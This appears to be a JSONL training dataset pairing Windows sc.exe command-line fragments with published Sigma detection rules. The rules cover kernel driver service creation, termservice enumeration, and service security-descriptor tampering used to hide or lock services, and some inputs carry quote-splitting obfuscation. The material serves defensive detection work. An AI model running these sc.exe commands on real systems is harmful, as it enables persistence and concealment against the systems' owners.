{"instruction": "Write Sigma rule to detect payload:", "input": "\\sc.exe create type binPath config kernel", "output": "title: New Kernel Driver Via SC.EXE\nid: 431a1fdb-4799-4f3b-91c3-a683b003fc49\nstatus: test\ndescription: Detects creation of a new service (kernel driver) with the type \"kernel\"\nreferences:\n    - https://www.aon.com/cyber-solutions/aon_cyber_labs/yours-truly-signed-av-driver-weaponizing-an-antivirus-driver/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-07-14\nmodified: 2022-08-08\ntags:\n    - attack.persistence\n    - attack.privilege-escalation\n    - attack.t1543.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\sc.exe'\n        CommandLine|contains:\n            - 'create'\n            - 'config'\n        CommandLine|contains|all:\n            - 'binPath'\n            - 'type'\n            - 'kernel'\n    condition: selection\nfalsepositives:\n    - Rare legitimate installation of kernel drivers via sc.exe\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sc.exe sc.exe query termservice", "output": "title: Interesting Service Enumeration Via Sc.EXE\nid: e83e8899-c9b2-483b-b355-5decc942b959\nstatus: test\ndescription: |\n    Detects the enumeration and query of interesting and in some cases sensitive services on the system via \"sc.exe\".\n    Attackers often try to enumerate the services currently running on a system in order to find different attack vectors.\nreferences:\n    - https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/\n    - https://pentestlab.blog/tag/svchost/\nauthor: Swachchhanda Shrawan Poudel\ndate: 2024-02-12\ntags:\n    - attack.t1003\n    - attack.credential-access\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\sc.exe'\n        - OriginalFileName: 'sc.exe'\n    selection_cli:\n        CommandLine|contains: 'query'\n    selection_cmd:\n        # Note: add more interesting services\n        CommandLine|contains: 'termservice'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\n# Note: can be upgraded to medium after an initial baseline\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sc.exe \"s\"\"c\"\".\"\"e\"\"x\"\"e\" query termservice", "output": "title: Interesting Service Enumeration Via Sc.EXE\nid: e83e8899-c9b2-483b-b355-5decc942b959\nstatus: test\ndescription: |\n    Detects the enumeration and query of interesting and in some cases sensitive services on the system via \"sc.exe\".\n    Attackers often try to enumerate the services currently running on a system in order to find different attack vectors.\nreferences:\n    - https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/\n    - https://pentestlab.blog/tag/svchost/\nauthor: Swachchhanda Shrawan Poudel\ndate: 2024-02-12\ntags:\n    - attack.t1003\n    - attack.credential-access\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\sc.exe'\n        - OriginalFileName: 'sc.exe'\n    selection_cli:\n        CommandLine|contains: 'query'\n    selection_cmd:\n        # Note: add more interesting services\n        CommandLine|contains: 'termservice'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\n# Note: can be upgraded to medium after an initial baseline\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sc.exe sc.exe query termservice", "output": "title: Interesting Service Enumeration Via Sc.EXE\nid: e83e8899-c9b2-483b-b355-5decc942b959\nstatus: test\ndescription: |\n    Detects the enumeration and query of interesting and in some cases sensitive services on the system via \"sc.exe\".\n    Attackers often try to enumerate the services currently running on a system in order to find different attack vectors.\nreferences:\n    - https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/\n    - https://pentestlab.blog/tag/svchost/\nauthor: Swachchhanda Shrawan Poudel\ndate: 2024-02-12\ntags:\n    - attack.t1003\n    - attack.credential-access\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\sc.exe'\n        - OriginalFileName: 'sc.exe'\n    selection_cli:\n        CommandLine|contains: 'query'\n    selection_cmd:\n        # Note: add more interesting services\n        CommandLine|contains: 'termservice'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\n# Note: can be upgraded to medium after an initial baseline\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sc sc query termservice", "output": "title: Interesting Service Enumeration Via Sc.EXE\nid: e83e8899-c9b2-483b-b355-5decc942b959\nstatus: test\ndescription: |\n    Detects the enumeration and query of interesting and in some cases sensitive services on the system via \"sc.exe\".\n    Attackers often try to enumerate the services currently running on a system in order to find different attack vectors.\nreferences:\n    - https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/\n    - https://pentestlab.blog/tag/svchost/\nauthor: Swachchhanda Shrawan Poudel\ndate: 2024-02-12\ntags:\n    - attack.t1003\n    - attack.credential-access\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\sc.exe'\n        - OriginalFileName: 'sc.exe'\n    selection_cli:\n        CommandLine|contains: 'query'\n    selection_cmd:\n        # Note: add more interesting services\n        CommandLine|contains: 'termservice'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\n# Note: can be upgraded to medium after an initial baseline\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sc.exe termservice sc.exe query", "output": "title: Interesting Service Enumeration Via Sc.EXE\nid: e83e8899-c9b2-483b-b355-5decc942b959\nstatus: test\ndescription: |\n    Detects the enumeration and query of interesting and in some cases sensitive services on the system via \"sc.exe\".\n    Attackers often try to enumerate the services currently running on a system in order to find different attack vectors.\nreferences:\n    - https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/\n    - https://pentestlab.blog/tag/svchost/\nauthor: Swachchhanda Shrawan Poudel\ndate: 2024-02-12\ntags:\n    - attack.t1003\n    - attack.credential-access\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\sc.exe'\n        - OriginalFileName: 'sc.exe'\n    selection_cli:\n        CommandLine|contains: 'query'\n    selection_cmd:\n        # Note: add more interesting services\n        CommandLine|contains: 'termservice'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\n# Note: can be upgraded to medium after an initial baseline\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sc.exe sc.exe sdset A; ;IU ;SU ;BA ;SY ;WD", "output": "title: Allow Service Access Using Security Descriptor Tampering Via Sc.EXE\nid: 6c8fbee5-dee8-49bc-851d-c3142d02aa47\nrelated:\n    - id: a537cfc3-4297-4789-92b5-345bfd845ad0 # Generic SD tampering\n      type: similar\nstatus: test\ndescription: Detects suspicious DACL modifications to allow access to a service from a suspicious trustee. This can be used to override access restrictions set by previous ACLs.\nreferences:\n    - https://twitter.com/0gtweet/status/1628720819537936386\n    - https://itconnect.uw.edu/tools-services-support/it-systems-infrastructure/msinf/other-help/understanding-sddl-syntax/\n    - https://learn.microsoft.com/en-us/windows/win32/secauthz/sid-strings\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-02-28\ntags:\n    - attack.persistence\n    - attack.t1543.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_sc:\n        - Image|endswith: '\\sc.exe'\n        - OriginalFileName: 'sc.exe'\n    selection_sdset:\n        CommandLine|contains|all:\n            - 'sdset'\n            - 'A;' # Allow Access\n    selection_trustee:\n        CommandLine|contains:\n            - ';IU' # Interactively logged-on user\n            - ';SU' # Service logon user\n            - ';BA' # Built-in administrators\n            - ';SY' # Local system\n            - ';WD' # Everyone\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sc.exe sc.exe sdset A; ;IU ;SU \\\";BA\\\" ;SY ;WD", "output": "title: Allow Service Access Using Security Descriptor Tampering Via Sc.EXE\nid: 6c8fbee5-dee8-49bc-851d-c3142d02aa47\nrelated:\n    - id: a537cfc3-4297-4789-92b5-345bfd845ad0 # Generic SD tampering\n      type: similar\nstatus: test\ndescription: Detects suspicious DACL modifications to allow access to a service from a suspicious trustee. This can be used to override access restrictions set by previous ACLs.\nreferences:\n    - https://twitter.com/0gtweet/status/1628720819537936386\n    - https://itconnect.uw.edu/tools-services-support/it-systems-infrastructure/msinf/other-help/understanding-sddl-syntax/\n    - https://learn.microsoft.com/en-us/windows/win32/secauthz/sid-strings\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-02-28\ntags:\n    - attack.persistence\n    - attack.t1543.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_sc:\n        - Image|endswith: '\\sc.exe'\n        - OriginalFileName: 'sc.exe'\n    selection_sdset:\n        CommandLine|contains|all:\n            - 'sdset'\n            - 'A;' # Allow Access\n    selection_trustee:\n        CommandLine|contains:\n            - ';IU' # Interactively logged-on user\n            - ';SU' # Service logon user\n            - ';BA' # Built-in administrators\n            - ';SY' # Local system\n            - ';WD' # Everyone\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sc sc sdset A; ;IU ;SU ;BA ;SY ;WD", "output": "title: Allow Service Access Using Security Descriptor Tampering Via Sc.EXE\nid: 6c8fbee5-dee8-49bc-851d-c3142d02aa47\nrelated:\n    - id: a537cfc3-4297-4789-92b5-345bfd845ad0 # Generic SD tampering\n      type: similar\nstatus: test\ndescription: Detects suspicious DACL modifications to allow access to a service from a suspicious trustee. This can be used to override access restrictions set by previous ACLs.\nreferences:\n    - https://twitter.com/0gtweet/status/1628720819537936386\n    - https://itconnect.uw.edu/tools-services-support/it-systems-infrastructure/msinf/other-help/understanding-sddl-syntax/\n    - https://learn.microsoft.com/en-us/windows/win32/secauthz/sid-strings\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-02-28\ntags:\n    - attack.persistence\n    - attack.t1543.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_sc:\n        - Image|endswith: '\\sc.exe'\n        - OriginalFileName: 'sc.exe'\n    selection_sdset:\n        CommandLine|contains|all:\n            - 'sdset'\n            - 'A;' # Allow Access\n    selection_trustee:\n        CommandLine|contains:\n            - ';IU' # Interactively logged-on user\n            - ';SU' # Service logon user\n            - ';BA' # Built-in administrators\n            - ';SY' # Local system\n            - ';WD' # Everyone\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sc.exe sc.exe sdset A; ;IU ;SU ;BA ;SY ;WD", "output": "title: Allow Service Access Using Security Descriptor Tampering Via Sc.EXE\nid: 6c8fbee5-dee8-49bc-851d-c3142d02aa47\nrelated:\n    - id: a537cfc3-4297-4789-92b5-345bfd845ad0 # Generic SD tampering\n      type: similar\nstatus: test\ndescription: Detects suspicious DACL modifications to allow access to a service from a suspicious trustee. This can be used to override access restrictions set by previous ACLs.\nreferences:\n    - https://twitter.com/0gtweet/status/1628720819537936386\n    - https://itconnect.uw.edu/tools-services-support/it-systems-infrastructure/msinf/other-help/understanding-sddl-syntax/\n    - https://learn.microsoft.com/en-us/windows/win32/secauthz/sid-strings\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-02-28\ntags:\n    - attack.persistence\n    - attack.t1543.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_sc:\n        - Image|endswith: '\\sc.exe'\n        - OriginalFileName: 'sc.exe'\n    selection_sdset:\n        CommandLine|contains|all:\n            - 'sdset'\n            - 'A;' # Allow Access\n    selection_trustee:\n        CommandLine|contains:\n            - ';IU' # Interactively logged-on user\n            - ';SU' # Service logon user\n            - ';BA' # Built-in administrators\n            - ';SY' # Local system\n            - ';WD' # Everyone\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sc.exe sc.exe sdset D; ;IU ;SU ;BA ;SY ;WD", "output": "title: Deny Service Access Using Security Descriptor Tampering Via Sc.EXE\nid: 99cf1e02-00fb-4c0d-8375-563f978dfd37\nrelated:\n    - id: 98c5aeef-32d5-492f-b174-64a691896d25 # Generic SD tampering\n      type: similar\n    - id: a537cfc3-4297-4789-92b5-345bfd845ad0 # Specific Technique\n      type: similar\nstatus: test\ndescription: Detects suspicious DACL modifications to deny access to a service that affects critical trustees. This can be used to hide services or make them unstoppable.\nreferences:\n    - https://www.sans.org/blog/red-team-tactics-hiding-windows-services/\n    - https://itconnect.uw.edu/tools-services-support/it-systems-infrastructure/msinf/other-help/understanding-sddl-syntax/\n    - https://learn.microsoft.com/en-us/windows/win32/secauthz/sid-strings\nauthor: Jonhnathan Ribeiro, oscd.community\ndate: 2020-10-16\nmodified: 2023-02-28\ntags:\n    - attack.persistence\n    - attack.t1543.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_sc:\n        - Image|endswith: '\\sc.exe'\n        - OriginalFileName: 'sc.exe'\n    selection_sdset:\n        CommandLine|contains|all:\n            - 'sdset'\n            - 'D;' # Deny Access\n    selection_trustee:\n        CommandLine|contains:\n            - ';IU' # Interactively logged-on user\n            - ';SU' # Service logon user\n            - ';BA' # Built-in administrators\n            - ';SY' # Local system\n            - ';WD' # Everyone\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\\"s\"\"c\"\".\"\"e\"\"x\"\"e\" sc.exe sdset D; ;IU ;SU ;BA ;SY ;WD", "output": "title: Deny Service Access Using Security Descriptor Tampering Via Sc.EXE\nid: 99cf1e02-00fb-4c0d-8375-563f978dfd37\nrelated:\n    - id: 98c5aeef-32d5-492f-b174-64a691896d25 # Generic SD tampering\n      type: similar\n    - id: a537cfc3-4297-4789-92b5-345bfd845ad0 # Specific Technique\n      type: similar\nstatus: test\ndescription: Detects suspicious DACL modifications to deny access to a service that affects critical trustees. This can be used to hide services or make them unstoppable.\nreferences:\n    - https://www.sans.org/blog/red-team-tactics-hiding-windows-services/\n    - https://itconnect.uw.edu/tools-services-support/it-systems-infrastructure/msinf/other-help/understanding-sddl-syntax/\n    - https://learn.microsoft.com/en-us/windows/win32/secauthz/sid-strings\nauthor: Jonhnathan Ribeiro, oscd.community\ndate: 2020-10-16\nmodified: 2023-02-28\ntags:\n    - attack.persistence\n    - attack.t1543.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_sc:\n        - Image|endswith: '\\sc.exe'\n        - OriginalFileName: 'sc.exe'\n    selection_sdset:\n        CommandLine|contains|all:\n            - 'sdset'\n            - 'D;' # Deny Access\n    selection_trustee:\n        CommandLine|contains:\n            - ';IU' # Interactively logged-on user\n            - ';SU' # Service logon user\n            - ';BA' # Built-in administrators\n            - ';SY' # Local system\n            - ';WD' # Everyone\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sc sc sdset D; ;IU ;SU ;BA ;SY ;WD", "output": "title: Deny Service Access Using Security Descriptor Tampering Via Sc.EXE\nid: 99cf1e02-00fb-4c0d-8375-563f978dfd37\nrelated:\n    - id: 98c5aeef-32d5-492f-b174-64a691896d25 # Generic SD tampering\n      type: similar\n    - id: a537cfc3-4297-4789-92b5-345bfd845ad0 # Specific Technique\n      type: similar\nstatus: test\ndescription: Detects suspicious DACL modifications to deny access to a service that affects critical trustees. This can be used to hide services or make them unstoppable.\nreferences:\n    - https://www.sans.org/blog/red-team-tactics-hiding-windows-services/\n    - https://itconnect.uw.edu/tools-services-support/it-systems-infrastructure/msinf/other-help/understanding-sddl-syntax/\n    - https://learn.microsoft.com/en-us/windows/win32/secauthz/sid-strings\nauthor: Jonhnathan Ribeiro, oscd.community\ndate: 2020-10-16\nmodified: 2023-02-28\ntags:\n    - attack.persistence\n    - attack.t1543.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_sc:\n        - Image|endswith: '\\sc.exe'\n        - OriginalFileName: 'sc.exe'\n    selection_sdset:\n        CommandLine|contains|all:\n            - 'sdset'\n            - 'D;' # Deny Access\n    selection_trustee:\n        CommandLine|contains:\n            - ';IU' # Interactively logged-on user\n            - ';SU' # Service logon user\n            - ';BA' # Built-in administrators\n            - ';SY' # Local system\n            - ';WD' # Everyone\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sc.exe sc.exe sdset D; ;IU ;SU ;BA ;SY ;WD", "output": "title: Deny Service Access Using Security Descriptor Tampering Via Sc.EXE\nid: 99cf1e02-00fb-4c0d-8375-563f978dfd37\nrelated:\n    - id: 98c5aeef-32d5-492f-b174-64a691896d25 # Generic SD tampering\n      type: similar\n    - id: a537cfc3-4297-4789-92b5-345bfd845ad0 # Specific Technique\n      type: similar\nstatus: test\ndescription: Detects suspicious DACL modifications to deny access to a service that affects critical trustees. This can be used to hide services or make them unstoppable.\nreferences:\n    - https://www.sans.org/blog/red-team-tactics-hiding-windows-services/\n    - https://itconnect.uw.edu/tools-services-support/it-systems-infrastructure/msinf/other-help/understanding-sddl-syntax/\n    - https://learn.microsoft.com/en-us/windows/win32/secauthz/sid-strings\nauthor: Jonhnathan Ribeiro, oscd.community\ndate: 2020-10-16\nmodified: 2023-02-28\ntags:\n    - attack.persistence\n    - attack.t1543.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_sc:\n        - Image|endswith: '\\sc.exe'\n        - OriginalFileName: 'sc.exe'\n    selection_sdset:\n        CommandLine|contains|all:\n            - 'sdset'\n            - 'D;' # Deny Access\n    selection_trustee:\n        CommandLine|contains:\n            - ';IU' # Interactively logged-on user\n            - ';SU' # Service logon user\n            - ';BA' # Built-in administrators\n            - ';SY' # Local system\n            - ';WD' # Everyone\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sc.exe sc.exe sdset DCLCWPDTSD", "output": "title: Service DACL Abuse To Hide Services Via Sc.EXE\nid: a537cfc3-4297-4789-92b5-345bfd845ad0\nrelated:\n    - id: 99cf1e02-00fb-4c0d-8375-563f978dfd37 # Deny Service Access\n      type: similar\n    - id: 98c5aeef-32d5-492f-b174-64a691896d25 # Generic SD tampering\n      type: similar\nstatus: test\ndescription: Detects usage of the \"sc.exe\" utility adding a new service with special permission seen used by threat actors which makes the service hidden and unremovable.\nreferences:\n    - https://blog.talosintelligence.com/2021/10/threat-hunting-in-large-datasets-by.html\n    - https://www.sans.org/blog/red-team-tactics-hiding-windows-services/\n    - https://twitter.com/Alh4zr3d/status/1580925761996828672\n    - https://itconnect.uw.edu/tools-services-support/it-systems-infrastructure/msinf/other-help/understanding-sddl-syntax/\nauthor: Andreas Hunkeler (@Karneades)\ndate: 2021-12-20\nmodified: 2022-08-08\ntags:\n    - attack.persistence\n    - attack.defense-evasion\n    - attack.privilege-escalation\n    - attack.t1574.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\sc.exe'\n        - OriginalFileName: 'sc.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'sdset'\n            # Summary of permissions\n            #   DC: Delete All Child Objects\n            #   LC: List Contents\n            #   WP: Write All Properties\n            #   DT: Delete Subtree\n            #   SD: Delete\n            - 'DCLCWPDTSD'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sc.exe sc.exe sdset \\\"DCLCWPDTSD\\\"", "output": "title: Service DACL Abuse To Hide Services Via Sc.EXE\nid: a537cfc3-4297-4789-92b5-345bfd845ad0\nrelated:\n    - id: 99cf1e02-00fb-4c0d-8375-563f978dfd37 # Deny Service Access\n      type: similar\n    - id: 98c5aeef-32d5-492f-b174-64a691896d25 # Generic SD tampering\n      type: similar\nstatus: test\ndescription: Detects usage of the \"sc.exe\" utility adding a new service with special permission seen used by threat actors which makes the service hidden and unremovable.\nreferences:\n    - https://blog.talosintelligence.com/2021/10/threat-hunting-in-large-datasets-by.html\n    - https://www.sans.org/blog/red-team-tactics-hiding-windows-services/\n    - https://twitter.com/Alh4zr3d/status/1580925761996828672\n    - https://itconnect.uw.edu/tools-services-support/it-systems-infrastructure/msinf/other-help/understanding-sddl-syntax/\nauthor: Andreas Hunkeler (@Karneades)\ndate: 2021-12-20\nmodified: 2022-08-08\ntags:\n    - attack.persistence\n    - attack.defense-evasion\n    - attack.privilege-escalation\n    - attack.t1574.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\sc.exe'\n        - OriginalFileName: 'sc.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'sdset'\n            # Summary of permissions\n            #   DC: Delete All Child Objects\n            #   LC: List Contents\n            #   WP: Write All Properties\n            #   DT: Delete Subtree\n            #   SD: Delete\n            - 'DCLCWPDTSD'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sc sc sdset DCLCWPDTSD", "output": "title: Service DACL Abuse To Hide Services Via Sc.EXE\nid: a537cfc3-4297-4789-92b5-345bfd845ad0\nrelated:\n    - id: 99cf1e02-00fb-4c0d-8375-563f978dfd37 # Deny Service Access\n      type: similar\n    - id: 98c5aeef-32d5-492f-b174-64a691896d25 # Generic SD tampering\n      type: similar\nstatus: test\ndescription: Detects usage of the \"sc.exe\" utility adding a new service with special permission seen used by threat actors which makes the service hidden and unremovable.\nreferences:\n    - https://blog.talosintelligence.com/2021/10/threat-hunting-in-large-datasets-by.html\n    - https://www.sans.org/blog/red-team-tactics-hiding-windows-services/\n    - https://twitter.com/Alh4zr3d/status/1580925761996828672\n    - https://itconnect.uw.edu/tools-services-support/it-systems-infrastructure/msinf/other-help/understanding-sddl-syntax/\nauthor: Andreas Hunkeler (@Karneades)\ndate: 2021-12-20\nmodified: 2022-08-08\ntags:\n    - attack.persistence\n    - attack.defense-evasion\n    - attack.privilege-escalation\n    - attack.t1574.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\sc.exe'\n        - OriginalFileName: 'sc.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'sdset'\n            # Summary of permissions\n            #   DC: Delete All Child Objects\n            #   LC: List Contents\n            #   WP: Write All Properties\n            #   DT: Delete Subtree\n            #   SD: Delete\n            - 'DCLCWPDTSD'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sc.exe sdset sc.exe DCLCWPDTSD", "output": "title: Service DACL Abuse To Hide Services Via Sc.EXE\nid: a537cfc3-4297-4789-92b5-345bfd845ad0\nrelated:\n    - id: 99cf1e02-00fb-4c0d-8375-563f978dfd37 # Deny Service Access\n      type: similar\n    - id: 98c5aeef-32d5-492f-b174-64a691896d25 # Generic SD tampering\n      type: similar\nstatus: test\ndescription: Detects usage of the \"sc.exe\" utility adding a new service with special permission seen used by threat actors which makes the service hidden and unremovable.\nreferences:\n    - https://blog.talosintelligence.com/2021/10/threat-hunting-in-large-datasets-by.html\n    - https://www.sans.org/blog/red-team-tactics-hiding-windows-services/\n    - https://twitter.com/Alh4zr3d/status/1580925761996828672\n    - https://itconnect.uw.edu/tools-services-support/it-systems-infrastructure/msinf/other-help/understanding-sddl-syntax/\nauthor: Andreas Hunkeler (@Karneades)\ndate: 2021-12-20\nmodified: 2022-08-08\ntags:\n    - attack.persistence\n    - attack.defense-evasion\n    - attack.privilege-escalation\n    - attack.t1574.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\sc.exe'\n        - OriginalFileName: 'sc.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'sdset'\n            # Summary of permissions\n            #   DC: Delete All Child Objects\n            #   LC: List Contents\n            #   WP: Write All Properties\n            #   DT: Delete Subtree\n            #   SD: Delete\n            - 'DCLCWPDTSD'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sc.exe sc.exe sdset", "output": "title: Service Security Descriptor Tampering Via Sc.EXE\nid: 98c5aeef-32d5-492f-b174-64a691896d25\nrelated:\n    - id: 99cf1e02-00fb-4c0d-8375-563f978dfd37 # Deny Service Access\n      type: similar\n    - id: a537cfc3-4297-4789-92b5-345bfd845ad0 # Specific Technique\n      type: similar\nstatus: test\ndescription: Detection of sc.exe utility adding a new service with special permission which hides that service.\nreferences:\n    - https://blog.talosintelligence.com/2021/10/threat-hunting-in-large-datasets-by.html\n    - https://www.sans.org/blog/red-team-tactics-hiding-windows-services/\n    - https://twitter.com/Alh4zr3d/status/1580925761996828672\n    - https://twitter.com/0gtweet/status/1628720819537936386\n    - https://itconnect.uw.edu/tools-services-support/it-systems-infrastructure/msinf/other-help/understanding-sddl-syntax/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-02-28\ntags:\n    - attack.persistence\n    - attack.defense-evasion\n    - attack.privilege-escalation\n    - attack.t1574.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\sc.exe'\n        - OriginalFileName: 'sc.exe'\n    selection_cli:\n        CommandLine|contains: 'sdset'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\"\\sc.exe\" sc.exe sdset", "output": "title: Service Security Descriptor Tampering Via Sc.EXE\nid: 98c5aeef-32d5-492f-b174-64a691896d25\nrelated:\n    - id: 99cf1e02-00fb-4c0d-8375-563f978dfd37 # Deny Service Access\n      type: similar\n    - id: a537cfc3-4297-4789-92b5-345bfd845ad0 # Specific Technique\n      type: similar\nstatus: test\ndescription: Detection of sc.exe utility adding a new service with special permission which hides that service.\nreferences:\n    - https://blog.talosintelligence.com/2021/10/threat-hunting-in-large-datasets-by.html\n    - https://www.sans.org/blog/red-team-tactics-hiding-windows-services/\n    - https://twitter.com/Alh4zr3d/status/1580925761996828672\n    - https://twitter.com/0gtweet/status/1628720819537936386\n    - https://itconnect.uw.edu/tools-services-support/it-systems-infrastructure/msinf/other-help/understanding-sddl-syntax/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-02-28\ntags:\n    - attack.persistence\n    - attack.defense-evasion\n    - attack.privilege-escalation\n    - attack.t1574.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\sc.exe'\n        - OriginalFileName: 'sc.exe'\n    selection_cli:\n        CommandLine|contains: 'sdset'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sc sc sdset", "output": "title: Service Security Descriptor Tampering Via Sc.EXE\nid: 98c5aeef-32d5-492f-b174-64a691896d25\nrelated:\n    - id: 99cf1e02-00fb-4c0d-8375-563f978dfd37 # Deny Service Access\n      type: similar\n    - id: a537cfc3-4297-4789-92b5-345bfd845ad0 # Specific Technique\n      type: similar\nstatus: test\ndescription: Detection of sc.exe utility adding a new service with special permission which hides that service.\nreferences:\n    - https://blog.talosintelligence.com/2021/10/threat-hunting-in-large-datasets-by.html\n    - https://www.sans.org/blog/red-team-tactics-hiding-windows-services/\n    - https://twitter.com/Alh4zr3d/status/1580925761996828672\n    - https://twitter.com/0gtweet/status/1628720819537936386\n    - https://itconnect.uw.edu/tools-services-support/it-systems-infrastructure/msinf/other-help/understanding-sddl-syntax/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-02-28\ntags:\n    - attack.persistence\n    - attack.defense-evasion\n    - attack.privilege-escalation\n    - attack.t1574.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\sc.exe'\n        - OriginalFileName: 'sc.exe'\n    selection_cli:\n        CommandLine|contains: 'sdset'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\sc.exe sdset sc.exe", "output": "title: Service Security Descriptor Tampering Via Sc.EXE\nid: 98c5aeef-32d5-492f-b174-64a691896d25\nrelated:\n    - id: 99cf1e02-00fb-4c0d-8375-563f978dfd37 # Deny Service Access\n      type: similar\n    - id: a537cfc3-4297-4789-92b5-345bfd845ad0 # Specific Technique\n      type: similar\nstatus: test\ndescription: Detection of sc.exe utility adding a new service with special permission which hides that service.\nreferences:\n    - https://blog.talosintelligence.com/2021/10/threat-hunting-in-large-datasets-by.html\n    - https://www.sans.org/blog/red-team-tactics-hiding-windows-services/\n    - https://twitter.com/Alh4zr3d/status/1580925761996828672\n    - https://twitter.com/0gtweet/status/1628720819537936386\n    - https://itconnect.uw.edu/tools-services-support/it-systems-infrastructure/msinf/other-help/understanding-sddl-syntax/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-02-28\ntags:\n    - attack.persistence\n    - attack.defense-evasion\n    - attack.privilege-escalation\n    - attack.t1574.011\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\sc.exe'\n        - OriginalFileName: 'sc.exe'\n    selection_cli:\n        CommandLine|contains: 'sdset'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
